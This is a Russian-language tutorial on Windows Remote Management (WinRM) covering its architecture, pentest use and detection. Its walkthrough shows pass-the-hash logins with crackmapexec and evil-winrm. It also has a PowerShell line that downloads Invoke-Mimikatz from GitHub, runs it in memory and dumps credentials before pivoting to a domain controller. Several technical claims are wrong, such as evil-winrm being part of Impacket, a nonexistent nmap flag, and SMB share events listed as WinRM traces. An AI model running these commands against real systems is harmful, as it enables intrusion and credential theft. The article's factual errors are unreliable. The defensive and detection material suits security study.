# Удалённое выполнение через WinRM: Архитектура, эксплуатация и детектирование

## Контекст и базовые понятия

Windows Remote Management (WinRM) — это реализация Microsoft стандарта WS-Management (WS-Man), который является SOAP-протоколом для обмена управляющими данными между устройствами. В контексте тестирования на проникновение и оценки защищённости инфраструктуры WinRM представляет собой критически важный вектор горизонтального перемещения (Lateral Movement), классифицируемый в MITRE ATT&CK как подтехника T1021.006. Понимание WinRM требует разграничения трёх смежных, но функционально различных сущностей: самого сервиса (службы), транспортного протокола и клиентских инструментов.

Служба `WinRM` (Windows Remote Management) — это фоновый процесс Windows Service Host (`svchost.exe`), который прослушивает входящие HTTP/HTTPS-запросы на портах 5985 и 5986 соответственно. Протокол WS-Management определяет формат XML-сообщений, передаваемых поверх HTTP/HTTPS. Клиентские инструменты (`winrs.exe`, PowerShell Remoting, `evil-winrm`) инициируют сессии, используя этот протокол для отправки команд и получения результатов.

Ключевое разграничение заключается в механизме аутентификации и шифрования. WinRM поддерживает Kerberos и NTLM. При использовании Kerberos сессия защищается симметричным ключом AES, что делает перехват и ретрансляцию (replay) трафика значительно сложнее по сравнению с чистым NTLM. Однако, если аутентификация настроена на NTLM, трафик не шифруется на уровне приложения (хотя может быть зашифрован на транспортном уровне TLS, если настроен HTTPS), что открывает возможности для атак типа NTLM Relay.

Частая путаница возникает между WinRM и PowerShell Remoting. PowerShell Remoting — это надстройка (transport-agnostic layer) над WinRM. WinRM — это транспорт, а PowerShell Remoting — способ использования этого транспорта для выполнения скриптов PowerShell. Однако WinRM также поддерживает выполнение произвольных бинарных файлов через утилиту `winrs.exe` (Windows Remote Shell), что делает его универсальным инструментом удалённого выполнения кода (Remote Code Execution, RCE), а не только выполнения скриптов.

| Сущность | Роль в архитектуре | Протокол/Транспорт | Аутентификация | Шифрование |
| :--- | :--- | :--- | :--- | :--- |
| **WinRM Service** | Серверная часть, прослушивает запросы | HTTP (5985) / HTTPS (5986) | Kerberos, NTLM, Basic | AES (при Kerberos), нет (при NTLM/HTTP) |
| **WS-Management** | Формат обмена данными (SOAP) | XML-пакеты поверх HTTP | Зависит от транспорта | Зависит от транспорта |
| **PowerShell Remoting** | Клиент/Сервер для выполнения PS-команд | WinRM (WS-Man) | Kerberos, NTLM | AES (при Kerberos) |
| **WinRS (winrs.exe)** | Клиент для выполнения произвольных команд | WinRM (WS-Man) | Kerberos, NTLM | AES (при Kerberos) |
| **WSMan.Automation** | COM-объект для вызова WinRM из .NET/C# | WinRM (WS-Man) | Зависит от контекста | Зависит от контекста |

Отличие WinRM от других методов горизонтального перемещения, таких как SMB (PsExec, T1021.002) или WMI (T1047), заключается в отсутствии необходимости в доступе к файловой системе или созданию сервисов на целевой машине. WinRM работает на уровне приложения, что делает его «живым из земли» (Living off the Land) и менее заметным для антивирусов, но более шумным в сетевых логах из-за специфического SOAP-трафика.

## Внутреннее устройство предмета

Архитектура WinRM базируется на клиент-сервной модели, где серверная часть реализует конечные точки (Endpoints). По умолчанию доступны две конечные точки: `Shell` (для интерактивных сессий) и `ShellWQL` (для выполнения запросов WQL). Клиент инициирует сессию, отправляя SOAP-запрос на конечную точку `Shell`. Сервер создает новый процесс `wsmprovhost.exe` (для PowerShell) или `winrshost.exe` (для winrs), который выполняет команду в контексте аутентифицированного пользователя.

### Компоненты и потоки данных

Процесс взаимодействия можно разделить на фазы: инициализация сессии, выполнение команды и завершение.

```text
[Client]                          [Server (svchost.exe)]
   |                                    |
   |--- HTTP POST (SOAP: CreateShell) -->|
   |                                    |-- Проверка аутентификации (Kerberos/NTLM)
   |                                    |-- Запуск wsmprovhost.exe / winrshost.exe
   |<-- HTTP 200 OK (ShellID) ---------|
   |                                    |
   |--- HTTP POST (SOAP: RunCommand) -->|
   |                                    |-- Выполнение команды в контексте пользователя
   |<-- HTTP 200 OK (Output) -----------|
   |                                    |
   |--- HTTP POST (SOAP: DeleteShell) ->|
   |                                    |-- Завершение wsmprovhost.exe
   |<-- HTTP 200 OK --------------------|
```

### Формат сообщения и инварианты

Сообщения WS-Management имеют строгую XML-структуру. Ключевые элементы SOAP-запроса включают `ResourceURI` (указывающий на конечную точку, например, `http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd`) и `SelectorSet` (параметры сессии).

```json
{
  "message_type": "SOAP",
  "action": "http://schemas.dmtf.org/wbem/wsman/1/wbem/wsman/RunCommand",
  "resource_uri": "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
  "selectors": {
    "ShellId": "<UUID_созданной_сессии>"
  },
  "command_line": {
    "CommandLine": "cmd /c whoami"
  }
}
```
*Примечание: Вышеприведенная структура является иллюстративной схемой полей SOAP-запроса WS-Management. Реальный формат требует полного обертывания в SOAP Envelope/Body и кодирования Base64 для бинарных данных.*

### Механизмы аутентификации и ограничения

WinRM использует механизм SPNEGO для выбора протокола аутентификации. Если клиент и сервер поддерживают Kerberos, используется он. В противном случае падбэк происходит на NTLM. Важным аспектом является настройка `TrustedHosts`. По умолчанию WinRM доверяет только хостам в том же домене или тем, которые явно добавлены в список доверенных. Это ограничение можно обойти, добавив `*` в `WSMan:\localhost\Client\TrustedHosts`, что критично для работы в рабочих группах (Workgroup) или при перемещении между подсетями без доверия.

С точки зрения безопасности, инвариантом является то, что `wsmprovhost.exe` всегда запускается в контексте пользователя, от имени которого выполнена аутентификация. Это означает, что права доступа к файлам и реестру на целевой машине соответствуют правам учетной записи, использованной для подключения.

## Применение и работа с предметом

На практике специалисты по безопасности используют WinRM для легитимного администрирования, а злоумышленники — для горизонтального перемещения. В рамках тестирования на проникновение работа с WinRM включает этапы обнаружения, аутентификации и выполнения.

### Обнаружение и разведка

Первым шагом является проверка доступности службы. Порт 5985 (HTTP) или 5986 (HTTPS) должен быть открыт. Инструменты вроде `nmap` или `crackmapexec` (cme) позволяют быстро сканировать сеть.

```bash
# Сканирование портов с определением версии службы
nmap -p 5985,5986 --service-info <target_ip>

# Проверка доступности WinRM через CrackMapExec
crackmapexec winrm <target_ip> -u <username> -p <password>
```

Если аутентификация успешна, следующим шагом является разведка. Важно определить, является ли учетная запись локальным администратором или доменной. Это влияет на возможность использования делегирования (CredSSP) или доступа к другим ресурсам.

### Выполнение команд

Существует несколько способов выполнения команд через WinRM:

1.  **PowerShell Remoting (`Invoke-Command`)**: Наиболее распространенный метод. Позволяет выполнять сложные скрипты.
2.  **WinRS (`winrs.exe`)**: Нативная утилита для выполнения одной команды. Полезен для обхода ограничений PowerShell (например, AMSI или ScriptBlock Logging, если они не настроены на уровне WinRM).
3.  **Evil-WinRM**: Инструмент из набора Impacket, позволяющий получить интерактивную оболочку.

```powershell
# Выполнение команды через PowerShell Remoting
Invoke-Command -ComputerName <target> -ScriptBlock { Get-Process } -Credential $cred

# Использование winrs для выполнения команды
winrs -r:<target> -u:<domain>\<user> -p:<password> cmd /c "whoami /all"
```

### Обход ограничений и тонкая настройка

При тестировании на проникновение часто возникает проблема с размером полезной нагрузки (payload). WinRM имеет ограничения на размер SOAP-сообщения. Для обхода этого ограничения используются техники сжатия или разделения payload на части. Также важно учитывать, что `Invoke-Command` может быть заблокирован политикой выполнения PowerShell (Execution Policy) или правилами детектирования (например, AMSI). Использование `winrs.exe` позволяет избежать загрузки PowerShell в память на целевой машине, что снижает шум.

Типичная ошибка при эксплуатации — игнорирование настройки `AllowUnencrypted`. Если она включена, NTLM-аутентификация может происходить без шифрования, что позволяет перехватить хеш. Однако в современных доменах Kerberos является стандартом, и перехват NTLM-трафика через WinRM требует специфических условий (например, отключения Kerberos или использования Basic Auth).

## Сквозной практический пример: Горизонтальное перемещение через WinRM с использованием краденных учетных данных

**Исходные условия:**
*   **Среда:** Active Directory домен `CORP.LOCAL`.
*   **Цель:** Сервер `SRV-WEB01` (Windows Server 2019), на котором включен WinRM (порт 5985 открыт).
*   **Инструменты:** `crackmapexec`, `evil-winrm`, `mimikatz` (в памяти).
*   **Роль:** Пентестер, имеющий доступ к рабочей станции `WORKSTATION01` с локальными правами администратора.
*   **Сценарий:** Пентестер получил хеш NTLM учетной записи локального администратора с `WORKSTATION01` с помощью Mimikatz и должен выполнить горизонтальное перемещение на `SRV-WEB01` для сбора данных.

### Шаг 1: Верификация доступности и аутентификации

Пентестер проверяет, доступен ли WinRM на целевом сервере и принимает ли он аутентификацию по NTLM с использованием украденного хеша.

```bash
# Проверка аутентификации через CrackMapExec
crackmapexec winrm 10.10.10.50 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:55556666777788889999000011112222 --port 5985
```

**Ожидаемый вывод:**
```text
10.10.10.50:5985    SRV-WEB01    [*] Windows 10.0 Build 17763 (name:SRV-WEB01)
10.10.10.50:5985    SRV-WEB01    [+] CORP.LOCAL\Administrator:aad3b435b51404eeaad3b435b51404ee:55556666777788889999000011112222
```
*Результат:* Успешная аутентификация подтверждает, что учетная запись имеет права на использование WinRM и порт доступен.

### Шаг 2: Получение интерактивной оболочки через Evil-WinRM

Для удобства работы и выполнения сложных команд пентестер использует `evil-winrm`, который поддерживает передачу хешей.

```bash
# Запуск интерактивной сессии
evil-winrm -i 10.10.10.50 -u Administrator -H 55556666777788889999000011112222
```

**Ожидаемый вывод:**
```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
*Результат:* Пентестер получил интерактивную PowerShell-оболочку на целевом сервере в контексте администратора.

### Шаг 3: Сбор информации и поиск учетных данных

В контексте администратора пентестер выполняет разведку для поиска других учетных данных или критических данных.

```powershell
# Получение информации о системе и пользователях
whoami /all
Get-LocalGroupMember "Administrators"

# Попытка экспорта хешей из LSASS (если разрешено)
Invoke-Expression (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

**Ожидаемый вывод:**
```text
...
User Name          Domain         Login ID         Session    Password Hash
---------------    ----------     ----------       -------    -------------
Domain Admin       CORP.LOCAL     0x...            Interactive NTLM: ...
...
```
*Результат:* Получены хеши других высокопривилегированных учетных записей, что позволяет масштабировать атаку.

### Шаг 4: Горизонтальное перемещение на следующий узел

Используя полученные хеши, пентестер пытается подключиться к другому серверу `SRV-DC01` через WinRM.

```bash
# Попытка подключения к контроллеру домена
crackmapexec winrm 10.10.10.10 -u DomainAdmin -H <hash_from_step3> --port 5985
```

**Ожидаемый вывод:**
```text
10.10.10.10:5985   SRV-DC01     [+] CORP.LOCAL\DomainAdmin:<hash>
```
*Результат:* Успешное горизонтальное перемещение достигнуто.

### Ожидаемый вывод примера

Демонстрируется полный цикл эксплуатации уязвимости конфигурации WinRM: от обнаружения службы до получения интерактивной оболочки и последующего горизонтального перемещения. Пример показывает, что наличие открытого порта 5985 и скомпрометированных учетных данных администратора позволяет злоумышленнику легко перемещаться по сети без использования стороннего вредоносного ПО.

## Аналитический вывод

Windows Remote Management является мощным инструментом администрирования, который одновременно представляет собой значительный риск для безопасности из-за своей распространенности и функциональности. Ключевая уязвимость заключается в том, что WinRM часто включен по умолчанию на серверных операционных системах и доверенных клиентах, что создает обширную поверхность атаки. Эксплуатация WinRM для горизонтального перемещения эффективна, поскольку она использует легитимные механизмы Windows, избегая многих сигнатурных детекторов антивирусов. Однако, этот метод оставляет четкие следы в журналах событий Windows (особенно Event ID 4624, 4688, 5140, 5145) и сетевом трафике (SOAP-запросы).

Для защиты от эксплуатации WinRM необходимо применять принцип наименьших привилегий: отключить WinRM на рабочих станциях, где он не требуется, и ограничить доступ к нему только для специализированных управляющих учетных записей (например, через JEA — Just Enough Administration). Использование HTTPS вместо HTTP и принудительное применение Kerberos вместо NTLM значительно усложняют перехват и ретрансляцию аутентификации. Детектирование аномалий должно фокусироваться на появлении процессов `wsmprovhost.exe` и `winrshost.exe` как дочерних процессов для нетипичных родительских процессов или на несанкционированных попытках подключения к порту 5985 извне доверенной сети.
